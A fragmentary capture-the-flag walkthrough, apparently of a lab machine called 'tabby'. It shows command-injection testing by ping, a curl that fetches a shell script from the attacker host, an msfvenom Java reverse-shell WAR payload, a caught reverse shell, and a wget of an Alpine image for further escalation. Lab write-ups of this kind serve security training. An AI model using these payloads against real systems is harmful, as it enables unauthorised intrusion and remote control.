...
```bash
Command was: ping -c 1 10.10.14.20

PING 10.10.14.20 (10.10.14.20) 56(84) bytes of data.
64 bytes from 10.10.14.20: icmp_seq=1 ttl=63 time=39.9 ms
...
Capturing on 'tun0'
    1 0.000000000 10.10.10.194 → 10.10.14.20  ICMP 84 Echo (ping) request  id=0x0001, seq=1/256, ttl=63
    2 0.000030851  10.10.14.20 → 10.10.10.194 ICMP 84 Echo (ping) reply    id=0x0001, seq=1/256, ttl=64 (request in 1)
```
...
```bash
Command was: curl http://10.10.14.20/sh.sh > /tmp/sh.sh
...
```bash
❯ msfvenom -p java/shell_reverse_tcp lhost=10.10.14.20 lport=4000 -f war -o pwn.war
...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.194] 39278
id
...
ash@tabby:/tmp$ wget 10.10.14.20/alpine-v3.22-x86_64-20250710_1926.tar.gz
```
